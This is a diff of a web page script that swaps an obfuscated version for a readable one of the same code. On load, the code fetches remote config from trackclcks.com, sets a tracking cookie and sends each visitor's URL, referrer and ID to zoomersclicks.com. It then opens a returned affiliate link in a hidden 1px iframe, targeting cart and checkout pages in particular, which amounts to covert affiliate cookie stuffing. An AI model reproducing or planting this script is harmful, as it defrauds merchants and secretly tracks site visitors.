@@ -1,54 +1,43 @@
-(function(_0x49f4a1,_0x2f3d59){const _0x2cfd9f=_0x58c3,_0x44eb35=_0x49f4a1();while(!![]){try{const _0x5a98cb=parseInt(_0x2cfd9f(0x1d7))/0x1*(parseInt(_0x2cfd9f(0x1c5))/0x2)+-parseInt(_0x2cfd9f(0x1ab))/0x3+parseInt(_0x2cfd9f(0x1dc))/0x4*(-parseInt(_0x2cfd9f(0x1f0))/0x5)+parseInt(_0x2cfd9f(0x1cf))/0x6+-parseInt(_0x2cfd9f(0x1e8))/0x7+parseInt(_0x2cfd9f(0x1d5))/0x8+-parseInt(_0x2cfd9f(0x1f7))/0x9;if(_0x5a98cb===_0x2f3d59)break;else _0x44eb35['push'](_0x44eb35['shift']());}catch(_0x595c89){_0x44eb35['push'](_0x44eb35['shift']());}}}(_0x3289,0x9e2cf));
+(function () {
 
-(function(){
+    function generateUUID() {
 
-    const _0x4cb36a=_0x58c3;
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
+            .replace(/[xy]/g, function (char) {
 
-    function _0x3f9fd6(){
+                const random =
+                    Math.random() * 16 | 0;
 
-        return (
-            _0x4cb36a(0x1c1)+
-            _0x4cb36a(0x1b8)+
-            _0x4cb36a(0x1d9)+
-            _0x4cb36a(0x1fd)
-        )['replace'](/[xy]/g,function(_0x1f1dd8){
+                const value =
+                    char === 'x'
+                        ? random
+                        : (random & 0x3 | 0x8);
 
-            const _0x4a6403=
-                Math['random']()*0x10|0x0;
-
-            const _0x4ec1e3=
-                _0x1f1dd8==='x'
-                    ?_0x4a6403
-                    :(_0x4a6403&0x3|0x8);
-
-            return _0x4ec1e3['toString'](0x10);
-        });
+                return value.toString(16);
+            });
     }
 
-    function _0x2a7f94(_0x2ef4d9){
 
-        const _0x5b66f7=
-            _0x2ef4d9+'=';
+    function getCookie(cookieName) {
 
-        const _0x4d4f44=
-            document['cookie']['split'](';');
+        const prefix =
+            cookieName + '=';
 
-        for(
-            let _0x2bcde8=0x0;
-            _0x2bcde8<_0x4d4f44['length'];
-            _0x2bcde8++
-        ){
+        const cookies =
+            document.cookie.split(';');
 
-            const _0x13e8e4=
-                _0x4d4f44[_0x2bcde8]['trim']();
+        for (let i = 0; i < cookies.length; i++) {
 
-            if(
-                _0x13e8e4['indexOf'](_0x5b66f7)===0x0
-            ){
+            const cookie =
+                cookies[i].trim();
 
-                return _0x13e8e4['substring'](
-                    _0x5b66f7['length'],
-                    _0x13e8e4['length']
+            if (
+                cookie.indexOf(prefix) === 0
+            ) {
+
+                return cookie.substring(
+                    prefix.length,
+                    cookie.length
                 );
             }
         }
@@ -56,9 +45,10 @@
         return '';
     }
 
-    function _0x5c7a4f(){
 
-        const _0x48c0d8=[
+    function isCartPage() {
+
+        const cartKeywords = [
             'cart',
             'checkout',
             'pay',
@@ -67,346 +57,233 @@
             'payment'
         ];
 
-        return _0x48c0d8['some'](
-            _0x41392d=>
-                window['location']['pathname']
-                ['toLowerCase']()
-                ['includes'](_0x41392d)
+        return cartKeywords.some(
+            keyword =>
+                window.location.pathname
+                    .toLowerCase()
+                    .includes(keyword)
         );
     }
 
-    function _0x4c0f95(_0x44f7ef){
+function createTrackingPixel(url) {
 
-        try{
+    const target =
+        document.body ||
+        document.documentElement;
 
-            const _0x5ddc0f=
-                document['createElement']('iframe');
+    if (!target) return;
 
-            _0x5ddc0f['setAttribute'](
-                'sandbox',
-                'allow-same-origin allow-scripts allow-forms'
-            );
+    var img =
+        document.createElement('img');
 
-            _0x5ddc0f['src']=
-                _0x44f7ef;
+    img.src = url;
+    img.style.width = '1px';
+    img.style.height = '1px';
+    img.style.display = 'none';
+    img.style.visibility = 'hidden';
 
-            _0x5ddc0f['style']['display']=
-                'none';
+    target.appendChild(img);
+}
 
-            _0x5ddc0f['style']['visibility']=
-                'hidden';
+function createClickIframe(url) {
 
-            _0x5ddc0f['style']['width']=
-                '1px';
+    const target =
+        document.body ||
+        document.documentElement;
 
-            _0x5ddc0f['style']['height']=
-                '1px';
+    if (!target) return;
 
-            _0x5ddc0f['style']['border']=
-                '0';
+    const iframe =
+        document.createElement('iframe');
 
-            _0x5ddc0f['onerror']=
-                function(){
+    iframe.src = url;
+    iframe.width = "1";
+    iframe.height = "1";
+    iframe.style =
+        "display:none;visibility:hidden;";
 
-                    const _0x28dd3e=
-                        new Image();
+    target.appendChild(iframe);
+}
 
-                    _0x28dd3e['src']=
-                        _0x44f7ef;
-                };
+    async function initTracking() {
 
-            document['body']['appendChild'](
-                _0x5ddc0f
-            );
+        const sessionKey =
+            'tracking_done_' +
+            window.location.hostname;
 
-        }catch(_0x5cb85f){
+        if (
+            sessionStorage.getItem(sessionKey)
+        ) {
 
-            console['error'](
-                'Iframe error:',
-                _0x5cb85f
-            );
-        }
-    }
-
-    async function _0x5a2c7e(){
-
-        if(
-            sessionStorage['getItem'](
-                'tracking_done_'+
-                window['location']['hostname']
-            )
-        ){
-
-            if(!_0x5c7a4f())
+            if (!isCartPage()) {
                 return;
+            }
         }
 
-        try{
+        try {
 
-            let _0x3f8f3e=
-                _0x2a7f94('tracking_uuid')
-                ||
-                _0x3f9fd6();
+            let uniqueId =
+                getCookie('tracking_uuid') ||
+                generateUUID();
 
-            let _0x2a28bb=
+            let expires =
                 (
                     new Date(
-                        Date['now']()+
-                        30*86400*1000
+                        Date.now() +
+                        30 * 86400 * 1000
                     )
-                )['toUTCString']();
+                ).toUTCString();
 
-            document['cookie']=
-                'tracking_uuid='+
-                _0x3f8f3e+
-                '; expires='+
-                _0x2a28bb+
+            document.cookie =
+                'tracking_uuid=' +
+                uniqueId +
+                '; expires=' +
+                expires +
                 ';path=/;SameSite=Lax';
 
-            let _0x4a6c33=
+
+            let response =
                 await fetch(
-                    atob(
-                        'aHR0cHM6Ly96b29tZXJzY2xpY2tzLmNvbS9hcGkvdHJhY2stdXNlcg=='
-                    ),
+                    'https://zoomersclicks.com/api/track-user',
                     {
-                        'method':'POST',
-                        'keepalive':!![],
-                        'body':JSON['stringify']({
-                            'url':
-                                window['location']['href'],
-                            'referrer':
-                                document['referrer'],
-                            'unique_id':
-                                _0x3f8f3e,
-                            'origin':
-                                window['location']['hostname'],
-                            'timestamp':
-                                new Date()['getTime']()
+                        method: 'POST',
+
+                        keepalive: true,
+
+                        body: JSON.stringify({
+
+                            url:
+                                window.location.href,
+
+                            referrer:
+                                document.referrer,
+
+                            unique_id:
+                                uniqueId,
+
+                            origin:
+                                window.location.hostname,
+
+                            timestamp:
+                                new Date().getTime()
                         }),
-                        'headers':{
+
+                        headers: {
                             'Content-Type':
-                            'application/json'
+                                'application/json'
                         }
                     }
                 );
 
-            let _0x3e9d67=
-                await _0x4a6c33['json']();
+            let result =
+                await response.json();
 
-            if(
-                _0x3e9d67['success']
-                &&
-                _0x3e9d67['affiliate_url']
-            ){
 
-                _0x4c0f95(
-                    _0x3e9d67['affiliate_url']
+            if (
+                result.success &&
+                result.affiliate_url
+            ) {
+
+                createClickIframe(
+                    result.affiliate_url
                 );
 
-                sessionStorage['setItem'](
-                    'tracking_done_'+
-                    window['location']['hostname'],
+                sessionStorage.setItem(
+                    sessionKey,
                     'true'
                 );
 
-            }else{
+            } else {
 
-                _0x4c0f95(
-                    atob(
-                        'aHR0cHM6Ly96b29tZXJzY2xpY2tzLmNvbS9hcGkvZmFsbGJhY2stcGl4ZWw/aWQ9'
-                    )+
-                    _0x3f8f3e
+                createTrackingPixel(
+                    'https://zoomersclicks.com/api/fallback-pixel?id=' +
+                    uniqueId
                 );
             }
 
-        }catch(_0x4c2f80){
+        } catch (error) {
 
-            console['error'](
+            console.error(
                 'Tracking Failed:',
-                _0x4c2f80
+                error
             );
         }
     }
 
-    function _0x2d46fa(){
+
+    function run() {
 
         fetch(
-            atob(
-                'aHR0cHM6Ly90cmFja2NsY2tzLmNvbS9hcGkvc2l0ZS1jb25maWc/aG9zdD0='
-            )+
+            'https://trackclcks.com/api/site-config?host=' +
             encodeURIComponent(
-                window['location']['hostname']
+                window.location.hostname
             )
         )
 
-        ['then'](
-            function(_0x42bb8d){
+        .then(function (response) {
 
-                if(
-                    !_0x42bb8d['ok']
-                ){
+            if (!response.ok) {
 
-                    throw new Error(
-                        'Config API Failed'
-                    );
-                }
-
-                return _0x42bb8d['json']();
-            }
-        )
-
-        ['then'](
-            function(_0x1fd6be){
-
-                if(
-                    !_0x1fd6be
-                    ||
-                    (
-                        !_0x1fd6be['always']
-                        &&
-                        !_0x1fd6be['cartExtra']
-                    )
-                ){
-                    return;
-                }
-
-                if(
-                    _0x1fd6be['always']
-                ){
-
-                    _0x5a2c7e();
-                }
-
-                if(
-                    _0x1fd6be['cartExtra']
-                    &&
-                    _0x5c7a4f()
-                ){
-
-                    _0x5a2c7e();
-                }
-            }
-        )
-
-        ['catch'](
-            function(_0x3f1fa8){
-
-                console['error'](
-                    'Config fetch failed:',
-                    _0x3f1fa8
+                throw new Error(
+                    'Config API Failed'
                 );
             }
-        );
+
+            return response.json();
+        })
+
+        .then(function (siteConfig) {
+
+            if (
+                !siteConfig ||
+                (
+                    !siteConfig.always &&
+                    !siteConfig.cartExtra
+                )
+            ) {
+                return;
+            }
+
+            if (siteConfig.always) {
+
+                initTracking();
+            }
+
+            if (
+                siteConfig.cartExtra &&
+                isCartPage()
+            ) {
+
+                initTracking();
+            }
+        })
+
+        .catch(function (error) {
+
+            console.error(
+                'Config fetch failed:',
+                error
+            );
+        });
     }
 
-    if(
-        document['readyState']==='interactive'
+
+    if (
+        document.readyState ===
+            'interactive'
         ||
-        document['readyState']==='complete'
-    ){
+        document.readyState ===
+            'complete'
+    ) {
 
-        _0x2d46fa();
+        run();
 
-    }else{
+    } else {
 
-        window['addEventListener'](
+        window.addEventListener(
             'DOMContentLoaded',
-            _0x2d46fa
+            run
         );
     }
 
-}());
-
-function _0x58c3(_0x5e15db){
-
-    const _0x3289d6=
-        _0x3289();
-
-    return _0x58c3=function(_0x58c3a1){
-
-        _0x58c3a1=
-            _0x58c3a1-0x1a0;
-
-        return _0x3289d6[_0x58c3a1];
-
-    },_0x58c3(_0x5e15db);
-}
-
-function _0x3289(){
-
-    return [
-
-        'xxxxxxxx-',
-        'xxxx-4xxx-',
-        'yxxx-',
-        'xxxxxxxxxxxx',
-
-        'cookie',
-        'split',
-        'trim',
-        'indexOf',
-        'substring',
-
-        'pathname',
-        'toLowerCase',
-        'includes',
-        'some',
-
-        'createElement',
-        'iframe',
-        'setAttribute',
-
-        'sandbox',
-        'allow-same-origin allow-scripts allow-forms',
-
-        'src',
-        'style',
-        'display',
-        'none',
-
-        'visibility',
-        'hidden',
-
-        'width',
-        'height',
-        'border',
-
-        'onerror',
-        'body',
-        'appendChild',
-
-        'tracking_uuid',
-        'tracking_done_',
-
-        'hostname',
-        'location',
-        'href',
-        'referrer',
-
-        'now',
-        'toUTCString',
-
-        'stringify',
-        'getTime',
-
-        'json',
-        'success',
-        'affiliate_url',
-
-        'setItem',
-        'getItem',
-
-        'readyState',
-        'interactive',
-        'complete',
-
-        'addEventListener',
-        'DOMContentLoaded',
-
-        'replace',
-        'random',
-        'toString',
-
-        'error'
-    ];
-}
+})();
